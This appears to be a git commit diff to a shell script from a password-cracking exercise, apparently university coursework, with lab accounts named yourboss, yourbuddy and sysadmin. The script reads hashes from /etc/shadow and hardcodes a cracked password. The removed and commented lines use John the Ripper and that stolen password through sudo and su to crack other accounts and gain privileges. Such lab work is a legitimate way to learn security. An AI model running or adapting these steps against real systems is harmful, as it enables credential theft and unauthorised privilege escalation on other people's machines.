761579937a4d6da7665f02511933e694efce9fce
William Lorey <wwlytc@mst.edu>
2019-04-16 10:02:50 -0500

    Remove yourbuddy

--- funandgames.sh
+++ funandgames.sh
@@ -6,53 +6,29 @@
 		sysadmin_hash=$line
 	elif [ "${line:0:8}" = "yourboss" ]; then 
 		yourboss_hash=$line
-	elif [ "${line:0:9}" = "yourbuddy" ]; then
-		yourbuddy_hash=$line
 	fi
  done < /etc/shadow
 
-# Crack the boss' password
+# Crack the boss' password using custom method
 # TODO: replaced yourboss_cracked with actual password for testing
  #./crack_password.py "$yourboss_hash" > temp.txt
  yourboss_cracked="money"
  #$(<temp.txt)
  echo $yourboss_cracked
+
+ whoami
+
+# echo "$yourboss_cracked" | su yourboss -S -c "whoami"
  
-# Get the buddy's password using john
-# NOTE: this must all be done using yourboss' account (for elevated privilege)
-# Format buddy's password
- ./format_password.py "$yourbuddy_hash" > temp_hash.txt
- yourbuddy_hash=$(<temp_hash.txt)
-
-# Update the john configuration
- echo "$yourboss_cracked" | sudo -u yourboss bash -c 'echo "
-[Incremental:BUDDY_CRACK]
-File = alpha.chr
-MinLen = 4
-MaxLen = 4
-CharCount = 26
-" | sudo tee -a /etc/john/john.conf' > temp.txt
-
-# Crack the password
- echo "$yourboss_cracked" | sudo -u yourboss john --incremental:buddy_crack temp_hash.txt > temp.txt
- echo "$yourboss_cracked" | sudo -u yourboss john --show temp_hash.txt > temp.txt
- yourbuddy_cracked=$(<temp.txt)
- echo $yourbuddy_cracked
-
-# echo "$yourboss_cracked" | sudo -u yourboss john --incremental:ascii temp_hash.txt > temp.txt
-# echo "a" | sudo -S echo "[Incremental:BUDDY_CRACK\nFile = \$JOHN/ascii.chr\nMinLen = 4\nMaxLen = 4\nCharCount = 95\n" >> /etc/john/john.config
-# echo "a" | sudo john --incremental:buddy_crack temp_hash.txt > temp.txt
-# echo "$yourboss_cracked" | sudo -u yourboss echo "[Incremental:BUDDY_CRACK\nFile = \$JOHN/ascii.chr\nMinLen = 4\nMaxLen = 4\nCharCount = 95\n" >> /etc/john/john.conf
-# echo "$yourboss_cracked" | sudo -u yourboss john --single --incremental:ascii "$yourbuddy_hash" > temp.txt
+# Crack the sysadmin's password using john
+# ./format_password.py "$sysadmin_hash" > temp_hash.txt
+# sysadmin_hash=$(<temp_hash.txt)
+# echo "$yourboss_cracked" | sudo -u yourboss john --wordlist=/usr/share/dict/american-english-small temp_hash.txt > temp.txt
 # echo "$yourboss_cracked" | sudo -u yourboss john --show temp_hash.txt > temp.txt
-# echo "a" | sudo -S echo "[Incremental:BUDDY_CRACK\nFile = \$JOHN/ascii.chr\nMinLen = 4\nMaxLen = 4\nCharCount = 95\n" >> /etc/john/john.config
-# echo "a" | sudo john --incremental:buddy_crack temp_hash.txt > temp.txt
-
-# Crack the sysadmin's password
- ./crack_password.py "$sysadmin_hash" > temp.txt
- sysadmin_cracked=$(<temp.txt)
- echo $sysadmin_cracked
+# sysadmin_cracked=$(<temp.txt)
+# echo $sysadmin_cracked
 
 # Cleanup 
- rm temp.txt
- rm temp_hash.txt
+# rm temp.txt
+# rm temp_hash.txt
+
